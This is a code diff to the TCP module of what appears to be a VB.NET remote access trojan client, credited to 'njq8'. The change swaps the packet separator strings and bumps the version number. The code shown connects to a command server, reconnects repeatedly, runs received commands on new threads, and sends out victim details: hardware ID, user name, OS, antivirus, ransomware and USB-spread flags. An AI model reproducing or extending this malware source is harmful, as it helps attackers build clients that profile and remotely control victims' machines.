@@ -2,8 +2,8 @@
 
 Public Class TCP
     'credit to njq8
-    Public Shared SPL As String = "|'N'|"
-    Public Shared KEY As String = "|'L'|"
+    Public Shared KEY As String = "|'N'|"
+    Public Shared SPL As String = "|'L'|"
     Public Shared C As Net.Sockets.TcpClient
 
     Public Shared Sub CON()
@@ -16,7 +16,7 @@ Public Class TCP
         Try
             Dim r As Object = New IO.MemoryStream
             r.Write(b, 0, b.Length)
-            r.Write(SB(SPL), 0, SPL.Length)
+            r.Write(SB(KEY), 0, KEY.Length)
             C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
             r.Dispose()
         Catch ex As Exception
@@ -46,8 +46,8 @@ re:
                 C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                 M.Write(B, 0, B.Length)
 rr:
-                If BS(M.ToArray).Contains(SPL) Then ' split packet..
-                    Dim A As Array = fx(M.ToArray, SPL)
+                If BS(M.ToArray).Contains(KEY) Then ' split packet..
+                    Dim A As Array = fx(M.ToArray, KEY)
                     Dim T As New Threading.Thread(AddressOf Commands.Data)
                     T.Start(A(0))
                     M.Dispose()
@@ -96,7 +96,7 @@ e:      ' clear things and ReConnect
             C.Client.Connect(Settings.HOST, Settings.PORT)
             CN = True
             'Send info to server
-            Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.5.2" & KEY & ID.MyOS & " " & ID.Bit & KEY & ID.INDATE & KEY & ID.AV & KEY & ID.Ransomeware & KEY & ID.USBSP & KEY & " ")
+            Send("info" & SPL & ID.HWID & SPL & ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.3" & SPL & ID.MyOS & " " & ID.Bit & SPL & ID.INDATE & SPL & ID.AV & SPL & ID.Ransomeware & SPL & ID.USBSP & SPL & " ")
         Catch ex As Exception
             Threading.Thread.CurrentThread.Sleep(2500)
             GoTo e
